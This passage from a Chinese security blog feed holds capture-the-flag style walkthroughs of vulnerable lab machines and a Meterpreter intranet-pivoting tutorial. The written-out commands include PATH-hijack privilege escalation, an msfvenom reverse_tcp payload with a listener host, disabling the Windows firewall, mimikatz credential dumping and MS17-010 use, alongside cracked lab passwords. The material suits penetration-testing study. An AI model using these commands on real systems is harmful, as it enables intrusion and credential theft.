alt="image-20230304132257002"></p><p><img src="/../images/image-20230304132307798-1686283466993.png" alt="image-20230304132307798"></p><p><img src="/../images/image-20230304132242555-1686283466993.png" alt="image-20230304132242555"></p><p>读取&#x2F;root&#x2F;root.txt获得第二个flag·</p><p><img src="/../images/image-20230304132345766-1686283466993.png" alt="image-20230304132345766"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>ssh日志包含getshell</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304141715650-1686283466994.png" alt="image-20230304141715650"></p><p><img src="/../images/image-20230304141957453-1686283466994.png" alt="image-20230304141957453"></p><p>几个网站都是ABAB。。</p><p>wp-admin目录只有一个readme</p><p><img src="/../images/image-20230304141834709-1686283466994.png" alt="image-20230304141834709"></p><p>恶作剧😡</p><p>回头看namp的默认脚本的扫描，可以看到robots.txt中禁止了一个&#x2F;eventadmins，访问</p><p><img src="/../images/image-20230304142524510-1686283466994.png" alt="image-20230304142524510"></p><p>再访问提示ctrl+a发现</p><p><img src="/../images/image-20230304142655946-1686283466994.png" alt="image-20230304142655946"></p><p><img src="/../images/image-20230304142745118-1686283466994.png" alt="image-20230304142745118"></p><p>再访问</p><p><img src="/../images/image-20230304142923226-1686283466994.png" alt="image-20230304142923226"></p><p>一开始想的是用九头蛇进行爆破，但是用户只知道root。</p><p>后面发现不行，想到日志的用途，尝试进行ssh日志包含getshell。</p><p>因为日志中会记录ssh连接的用户名</p><p><img src="/../images/image-20230304165054436-1686283466994.png" alt="image-20230304165054436"></p><p>所以</p><p><img src="/../images/image-20230304165131376-1686283466994.png" alt="image-20230304165131376"></p><p>反弹shell</p><p><img src="/../images/image-20230304165152817-1686283466994.png" alt="image-20230304165152817"></p><p><img src="/../images/image-20230304165204015-1686283466994.png" alt="image-20230304165204015"></p><p>这里和上一个靶机一样，存在另一个用户robertj，并且www-data无法提权</p><p>按照上一个的思路查看.ssh目录，发现为空</p><p><img src="/../images/image-20230304165345630-1686283466994.png" alt="image-20230304165345630"></p><p>选择直接生成ssh密钥</p><img src="../../../typora img/image-20230304175028256.png" alt="image-20230304175028256" style="zoom:80%;" /><p>查看ssh配置文件：只允许密钥验证方式连接，并且用来验证的公钥为authorized_keys</p><p><img src="/../images/image-20230304171108734-1686283466994.png" alt="image-20230304171108734"></p><p>所以需要将公钥id_rsa.pub改为authorized_keys</p><p>然后用python在靶机上开一个http服务器，kali使用wget命令下载私钥，并修改私钥权限，最后ssh登录</p><p><img src="/../images/image-20230304175249187-1686283466994.png" alt="image-20230304175249187"></p><p>提权</p><p><img src="/../images/image-20230304174502247-1686283466994.png" alt="image-20230304174502247"></p><p>一开始想用strings查看的，但是没有安装，那就直接用一下看看</p><p><img src="/../images/image-20230304174629368-1686283466994.png" alt="image-20230304174629368"></p><p>可以知道这个命令实质上是执行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address</span><br><span class="line">cat /etc/hosts</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>那么我们选一个进行构造即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod 777 uname </span><br><span class="line">export PATH=/home/robertj:$PATH</span><br></pre></td></tr></table></figure><p>然后执行getinfo即可</p><p><img src="/../images/image-20230304174854741-1686283466995.png" alt="image-20230304174854741"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><ul><li>misc获得人员信息</li><li>ftp爆破</li><li>ftp+sync服务，导致可以通过ftp服务器操作网站服务器目录</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304191909931-1686283466995.png" alt="image-20230304191909931"></p><p>网站注释解码，访问另一个网站，brainfuck解码，二维码扫描最后得到如下</p><p><img src="/../images/image-20230304204625662-1686283466995.png" alt="image-20230304204625662"></p><p>收集到了网站技术人员的名字，可以尝试爆破ftp和ssh服务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure><p>ssh无果</p><p>ftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: luther   password: mypics</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230304210341290-1686283466995.png" alt="image-20230304210341290"></p><p><img src="/../images/image-20230304211248271-1686283466995.png" alt="image-20230304211248271"></p><p>发现了一个目录，目录名为hubert是收集到的一个用户，并且uid和gid为1001，证明其是第一个用户，所以该目录为hubert用户的家目录。</p><p>另一个文件使用get命令下载到本地后</p><p><img src="/../images/image-20230304212449213-1686283466995.png" alt="image-20230304212449213"></p><p>可以发现是一个同步完成的日志。</p><blockquote><p>所以根据这两个信息，我们可以知道服务器会同步这个ftp上的文件，就相当于我们可以操作hubert用户的家目录。</p></blockquote><p>我们使用put命令上传自己的公钥</p><p><img src="/../images/image-20230304212132365-1686283466995.png" alt="image-20230304212132365"></p><p>需要注意公钥名</p><p><img src="/../images/image-20230304212209119-1686283466995.png" alt="image-20230304212209119"></p><p>然后ssh连接</p><p><img src="/../images/image-20230304212235168-1686283466995.png" alt="image-20230304212235168"></p><p>看下家目录有啥</p><p><img src="/../images/image-20230304212842826-1686283466995.png" alt="image-20230304212842826"></p><p>读取这个root权限的py文件，我们可以知道这个网站被黑客frica攻击了，并且留下了后门，所以这也是为什么前面叫人来修复网站的原因🤣</p><p>这个黑客还告诉我们他留下了松散的权限😍</p><p><img src="/../images/image-20230304212825018-1686283466995.png" alt="image-20230304212825018"></p><p>让我康康</p><p><img src="/../images/image-20230304213424178-1686283466995.png" alt="image-20230304213424178"></p><p>这次有strings命令，查看getinfo</p><p><img src="/../images/image-20230304213618067-1686283466995.png" alt="image-20230304213618067"></p><p>跟上一个靶机一样</p><p><img src="/../images/image-20230304213721571-1686283466995.png" alt="image-20230304213721571"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/../images/image-20230305160546454-1686283466995.png" alt="image-20230305160546454"></p><p><img src="/../images/image-20230305163954224-1686283466995.png" alt="image-20230305163954224"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230305160724611-1686283466995.png" alt="image-20230305160724611"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure><p>密码字典生成</p><p><img src="/../images/image-20230305162409527-1686283466995.png" alt="image-20230305162409527"></p><blockquote><p>-m 6 是因为wordpress密码最少6个字符</p></blockquote><p>爆破密码</p><p><img src="/../images/image-20230305162556601-1686283466995.png" alt="image-20230305162556601"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill / interchangeable</span><br></pre></td></tr></table></figure><p>普通用户，后台只找到一张可以图片DB</p><p><img src="/../images/image-20230305164352862-1686283466996.png" alt="image-20230305164352862"></p><p>分析这张图片</p><p><img src="/../images/image-20230305164731337-1686283466996.png" alt="image-20230305164731337"></p><p><img src="/../images/image-20230305164827742-1686283466996.png" alt="image-20230305164827742"></p><p>得到ssh账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill 59583hello</span><br></pre></td></tr></table></figure><p>登陆后发现</p><p><img src="/../images/image-20230305165100247-1686283466996.png" alt="image-20230305165100247"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lost+found目录无权限</span><br><span class="line"></span><br><span class="line">家目录下有一个kEYFILE</span><br></pre></td></tr></table></figure><p>通过搜索得到</p><p><img src="/../images/image-20230305165731867-1686283466996.png" alt="image-20230305165731867"></p><p><img src="/../images/image-20230305171048832-1686283466996.png" alt="image-20230305171048832"></p><p>可以使用john进行破解，机子GPU太垃圾了，直接从wp拿到密码</p><p>获得密码后，可以用KeePass软件<a href="https://sourceforge.net/projects/keepass/%E6%89%93%E5%BC%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99">https://sourceforge.net/projects/keepass/打开，也可以用在线网站</a></p><p><a href="https://app.keeweb.info/%E6%89%93%E5%BC%80%E3%80%82">https://app.keeweb.info/打开。</a></p><p>打开后发现6个空白的key</p><p><img src="/../images/image-20230305172848464-1686283466996.png" alt="image-20230305172848464"></p><p>不知道拿来干嘛的。。</p><p>继续信息收集，发现根目录下有一个keyfolder，可能就是要让上面的key放在这个keyfolder</p><p>而且使用pyps64监控进程发现有一个定时任务key.sh，每一分钟执行一次。</p><p><img src="/../images/image-20230305172941445-1686283466996.png" alt="image-20230305172941445"></p><p>经测试当只有一个文件fracturedocean时</p><p><img src="/../images/image-20230305174849955-1686283466996.png" alt="image-20230305174849955"></p><p><img src="/../images/image-20230305175028644-1686283466996.png" alt="image-20230305175028644"></p><p>定时脚本内容</p><p><img src="/../images/image-20230305175728426-1686283466996.png" alt="image-20230305175728426"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/../images/image-20230307141431844-1686283466996.png" alt="image-20230307141431844"></p><p>只开放了80端口</p><p><img src="/../images/image-20230307141917191-1686283466996.png" alt="image-20230307141917191"></p><p>提示我们目录扫描要添加zip类型，说明网站目录应该存在zip文件</p><p>目录扫描</p><p>dirserach</p><p><img src="/../images/image-20230307142511029-1686283466996.png" alt="image-20230307142511029"></p><p>gobuster</p><p><img src="/../images/image-20230307142447064-1686283466996.png" alt="image-20230307142447064"></p><p>访问&#x2F;spammer下载得到spammer.zip</p><p>使用john爆破</p><p><img src="/../images/image-20230307142628410-1686283466997.png" alt="image-20230307142628410"></p><p>解压得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>访问网站</p><p><img src="/../images/image-20230307141958670-1686283466997.png" alt="image-20230307141958670"></p><p>尝试登录解压得到的用户，成功登录</p><p><img src="/../images/image-20230307142917723-1686283466997.png" alt="image-20230307142917723"></p><p>逛了一圈发现，页面编辑，邮箱泄露，插件（无法加载作罢）。</p><ul><li><p>网站配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62)</span><br><span class="line">Last update: 2020-09-13 19:56:06</span><br><span class="line">Site URL: 192.168.2.35/textpattern</span><br><span class="line">Admin URL: 192.168.2.35/textpattern/textpattern</span><br><span class="line">Document root: /var/www</span><br><span class="line">$path_to_site: /var/www/textpattern</span><br><span class="line">Textpattern path: /var/www/textpattern/textpattern</span><br><span class="line">Article URL pattern: messy</span><br><span class="line">Production status: testing</span><br><span class="line">Temporary directory path: /tmp</span><br><span class="line">PHP version: 5.5.38-1~dotdeb+7.1</span><br><span class="line">GD Graphics Library: Unavailable</span><br><span class="line">Server timezone: UTC</span><br><span class="line">Server local time: 2023-03-07 14:40:29</span><br><span class="line">Daylight Saving Time enabled?: 0</span><br><span class="line">Automatically adjust Daylight Saving Time setting?: 1</span><br><span class="line">Time zone (GMT offset in seconds): Asia/Baghdad (10800)</span><br><span class="line">MySQL: 5.5.47-0+deb7u1 ((Debian)) </span><br><span class="line">Database server time: 2023-03-07 08:40:29</span><br><span class="line">Database server time offset: 0 s</span><br><span class="line">Database server timezone: SYSTEM</span><br><span class="line">Database session timezone: SYSTEM</span><br><span class="line">Locale: C</span><br><span class="line">Site / Admin language: en / en</span><br><span class="line">Web server: Apache/2.2.22 (Debian)</span><br><span class="line">Apache version: Apache/2.2.22 (Debian)</span><br><span class="line">PHP server API: apache2handler</span><br><span class="line">RFC 2616 headers: </span><br><span class="line">Server OS: Linux 3.2.0-4-amd64</span><br><span class="line">Admin-side theme: hive 4.8.3</span><br><span class="line"></span><br><span class="line">Pre-flight check: </span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">New Textpattern version 4.8.8 available for download. Help</span><br><span class="line"></span><br><span class="line">DNS lookup failed: 192.168.2.35 Help</span><br><span class="line"></span><br><span class="line">/var/www/textpattern/textpattern/setup/ still exists. Help</span><br><span class="line"></span><br><span class="line">Site URL preference might be incorrect: 192.168.174.159/textpattern Help</span><br><span class="line"></span><br><span class="line">Image directory is not writable: /var/www/textpattern/images</span><br><span class="line">Theme directory is not writable: /var/www/textpattern/themes</span><br><span class="line">Plugin directory is not writable: /var/www/textpattern/textpattern/plugins Help</span><br><span class="line">------------------------</span><br><span class="line"></span><br><span class="line">.htaccess file contents: </span><br><span class="line">------------------------</span><br><span class="line"># BEGIN Textpattern</span><br><span class="line"></span><br><span class="line">#DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Enable the `FollowSymLinks` option below if it isn&#x27;t already.</span><br><span class="line">    #Options +FollowSymlinks</span><br><span class="line"></span><br><span class="line">    #RewriteBase /relative/web/path/</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f [OR]</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">    RewriteRule ^(.+) - [PT,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !=/favicon.ico</span><br><span class="line">    RewriteRule ^(.*) index.php</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;HTTP:Authorization&#125;  !^$</span><br><span class="line">    RewriteRule .* - [E=REMOTE_USER:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_mime.c&gt;</span><br><span class="line">    AddType image/svg+xml  svg svgz</span><br><span class="line">    AddEncoding gzip       svgz</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># For additional Apache-compatible web server configuration settings to enhance</span><br><span class="line"># site performance and security, we recommend:</span><br><span class="line"># https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess</span><br><span class="line"></span><br><span class="line"># END Textpattern</span><br><span class="line"></span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure></li><li><p>文件上传</p><p>可以直接上传🐎，无任何防护</p><p>漏洞分析：<a href="https://blog.csdn.net/yun2diao/article/details/92765372">https://blog.csdn.net/yun2diao/article/details/92765372</a></p><p>反弹shell</p><img src="../../../typora img/image-20230307151417930.png" alt="image-20230307151417930" style="zoom:80%;" /></li></ul><p>提权</p><p>上传linepeas.sh查找可提权项</p><p>这里查找CVE</p><p><img src="/../images/image-20230307153044644-1686283466997.png" alt="image-20230307153044644"></p><p>选择一个cve进行提权，我这里选择的是脏牛提权<a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p><img src="/../images/image-20230307154757476-1686283466997.png" alt="image-20230307154757476"></p><p><img src="/../images/image-20230307154831929-1686283466997.png" alt="image-20230307154831929"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/../images/image-20230307182708576-1686283466997.png" alt="image-20230307182708576"></p><p><img src="/../images/image-20230307182726635-1686283466997.png" alt="image-20230307182726635"></p><p>开放了很多端口和服务，不同端口上都有网站，所以目录扫描时需要注意扫哪个端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66</span><br><span class="line">80</span><br><span class="line">8086</span><br></pre></td></tr></table></figure><ul><li><p>80端口</p><p><img src="/../images/image-20230307224547682-1686283466997.png" alt="image-20230307224547682"></p><p>msf一条龙</p></li></ul><p><img src="/../images/image-20230307224427084-1686283466997.png" alt="image-20230307224427084"></p><p><img src="/../images/image-20230307224412649-1686283466997.png" alt="image-20230307224412649"></p><ul><li><p>66端口</p><p>dirsearch扫描结果</p><p><img src="/../images/image-20230307224912102-1686283466997.png" alt="image-20230307224912102"></p><p><img src="/../images/image-20230307224854194-1686283466998.png" alt="image-20230307224854194"></p><p>​历史命令操作.bash_history重要部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line">mv root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br></pre></td></tr></table></figure><p>可以发现从别的主机上复制了flag，并重名为flag.txt</p></li><li><p>8086</p><p><img src="/../images/image-20230307225845372-1686283466998.png" alt="image-20230307225845372"></p><p>都是静态页面</p></li></ul><p>这里看了wp正常是从66端口目录扫描出&#x2F;eno目录，下载并破解zip压缩包，获得80端口的用户凭证的。。</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>不知道为什么没有8</p><p><img src="/../images/image-20230307232027664-1686283466998.png" alt="image-20230307232027664"></p><p>网站</p><p>只有一个登录框</p><p>sql注入失败，弱口令爆破失败</p><p>目录扫描</p><p><img src="/../images/image-20230307234601067-1686283466998.png" alt="image-20230307234601067"></p><p>看到backup还以为有备份文件可以进行代码审计，但是没有；</p><p>访问&#x2F;admin&#x2F;home.php尝试是否存在未授权，发现没有。</p><p>寻找网站框架漏洞 </p><p><img src="/../images/image-20230307234835760-1686283466999.png" alt="image-20230307234835760"></p><p>尝试了之后发现只存在rce漏洞</p><p><img src="/../images/image-20230307233410737-1686283466999.png" alt="image-20230307233410737"></p><p><img src="/../images/image-20230307233603248-1686283466999.png" alt="image-20230307233603248"></p><p><img src="/../images/image-20230307233643324-1686283466999.png" alt="image-20230307233643324"></p><p>使用第二个py脚本</p><p><img src="/../images/image-20230308001806203-1686283466999.png" alt="image-20230308001806203"></p><p><img src="/../images/image-20230308001820794-1686283466999.png" alt="image-20230308001820794"></p><p>这个脚本很贴心地给出了服务器信息，并读取了配置文件，获得了clapton用户的凭证。</p><p><img src="/../images/image-20230307234930848-1686283467000.png" alt="image-20230307234930848"></p><p>发现大部分命令明明可以使用的却都执行不了，所以需要反弹shell到kali，经测试可以使用nc进行反弹shell</p><p><img src="/../images/image-20230308130950848-1686283467000.png" alt="image-20230308130950848"></p><p>使用python切换为交互式shell，切换到clapton用户</p><p><img src="/../images/image-20230308131017546-1686283467000.png" alt="image-20230308131017546"></p><p>发现clapton家目录下有note.txt</p><p><img src="/../images/image-20230308131125354-1686283467000.png" alt="image-20230308131125354"></p><p>读取</p><p><img src="/../images/image-20230308131243068-1686283467000.png" alt="image-20230308131243068"></p><p>提示我们用缓冲区溢出漏洞提权，这部分pwn不会</p><p>按照下面文章中的方法进行复现</p><p><a href="https://zhuanlan.zhihu.com/p/570218595">https://zhuanlan.zhihu.com/p/570218595</a></p><p>最后贴上复现成功的截图</p><p><img src="/../images/image-20230308130938122-1686283467000.png" alt="image-20230308130938122"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日ATTC&amp;CK靶场1</title>
      <link href="/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/06/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过MSF对红日靶场1进行内网渗透</p><p>获得服务器权限就不写了</p></blockquote><h2 id="获得外网主机权限"><a href="#获得外网主机权限" class="headerlink" title="获得外网主机权限"></a>获得外网主机权限</h2><h3 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128  -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><p><strong>reverse_tcp与bind_tcp的区别</strong></p><p><img src="/../images/1605154-20200928100839725-1360637319-1686283281460.png" alt="img"></p><h3 id="防火墙关闭"><a href="#防火墙关闭" class="headerlink" title="防火墙关闭"></a>防火墙关闭</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li><p>查看状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure></li><li><p>更改状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofile state on/off</span><br></pre></td></tr></table></figure><p>不关的话，执行木马就会弹出这个</p><p><img src="/../images/image-20230324195048832-1686283281461.png" alt="image-20230324195048832"></p></li></ul><h3 id="获得主机session"><a href="#获得主机session" class="headerlink" title="获得主机session"></a>获得主机session</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp # 要设置木马的生成payload，不然连不上</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324151026344-1686283281461.png" alt="image-20230324151026344"></p><h2 id="信息收集等"><a href="#信息收集等" class="headerlink" title="信息收集等"></a>信息收集等</h2><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><ol><li><p>隐蔽自身</p><p>选择注入到explorer.exe进程中</p><blockquote><p>explorer.exe是<a href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>程序管理器或者<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/58635296?fromModule=lemma_inlink">文件资源管理器</a>，它用于管理Windows图形壳，包括桌面和<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1452357?fromModule=lemma_inlink">文件管理</a>，删除该程序会导致Windows<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283?fromModule=lemma_inlink">图形界面</a>无法使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps | grep &quot;explore&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324152046245-1686283281461.png" alt="image-20230324152046245"></p></li><li><p>切换进程位数</p><blockquote><p>不同的程序需要的位数不同</p><p>如：hashdump，kiwi只能在64位进程上执行</p></blockquote></li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><blockquote><p>先获取到administrator权限</p><p>再使用getsystem命令获取system权限</p></blockquote><p><img src="/../images/image-20230324152320920-1686283281461.png" alt="image-20230324152320920"></p><h4 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主机信息</span></span><br><span class="line">ps</span><br><span class="line">sysinfo</span><br><span class="line">run post/windows/gather/enum_applications # 安装的应用</span><br><span class="line">run post/windows/gather/enum_patches # 安装的补丁</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络</span></span><br><span class="line">route</span><br><span class="line">arp</span><br><span class="line">netstat –ano</span><br><span class="line"></span><br><span class="line">shell </span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324155246737-1686283281461.png" alt="image-20230324155246737"></p><p>主机shell下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001 #解决乱码</span><br><span class="line">ipconfig /all # DNS后缀判断域是否存在</span><br><span class="line">net time /domain # 判断域控</span><br><span class="line">nslookup time_domain # 获取域控ip</span><br></pre></td></tr></table></figure><h4 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="调用mimikatz"><a href="#调用mimikatz" class="headerlink" title="调用mimikatz"></a>调用mimikatz</h5><blockquote><p>在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatz命令</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">后渗透]Mimikatz使用大全 - 肖洋肖恩、 - 博客园</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1234 -p 4444 -r 192.168.41.129</span><br></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="Venom代理"><a href="#Venom代理" class="headerlink" title="Venom代理"></a>Venom代理</h3><p><a href="https://blog.csdn.net/u011215939/article/details/103403545">内网穿透工具—Venom使用教程</a></p><p><img src="/../images/image-20230331194420393-1686283281461.png" alt="image-20230331194420393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks port</span><br><span class="line">然后配合proxychains使用</span><br></pre></td></tr></table></figure><h3 id="sockets代理"><a href="#sockets代理" class="headerlink" title="sockets代理"></a>sockets代理</h3><h4 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h4><ul><li>为当前sesison添加路由</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170547279-1686283281461.png" alt="image-20230324170547279"></p><ul><li><p>使用socks5模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170759790-1686283281461.png" alt="image-20230324170759790"></p><p>这里需要按一下回车</p><ul><li>查看jobs <img src="/../images/image-20230324170854437-1686283281462.png" alt="image-20230324170854437"></li></ul></li></ul><h4 id="kali配置"><a href="#kali配置" class="headerlink" title="kali配置"></a>kali配置</h4><blockquote><p>让kali中的其他工具也可访问内网主机</p></blockquote><ul><li><p>安装proxychains</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure></li><li><p>编辑配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>按照info给出的信息，添加socket代理</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VERSION SRVHOST SRVPORT USERNAME PASSWORD</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324171113565-1686283281462.png" alt="image-20230324171113565"></p></li></ul><p><img src="/../images/image-20230324170936060-1686283281462.png" alt="image-20230324170936060"></p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure><h3 id="端口和漏洞扫描"><a href="#端口和漏洞扫描" class="headerlink" title="端口和漏洞扫描"></a>端口和漏洞扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">上传fscan进行扫描</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC  192.168.52.141</span><br></pre></td></tr></table></figure><p>注意：socks5代理-Pn -sT，不支持icmp协议</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据fscan的扫描结果可以知道域中三台主机均存在ms17_010漏洞</p><p>利用</p><p><img src="/../images/image-20230324192937093-1686283281462.png" alt="image-20230324192937093"></p><p>经过测试，发现只能用<code>admin/smb/ms17_010_command</code></p><p>在Windows2003主机上</p><p><img src="/../images/image-20230330141915854-1686283281462.png" alt="image-20230330141915854"></p><p>添加成功</p><p><img src="/../images/image-20230330142326253-1686283281462.png" 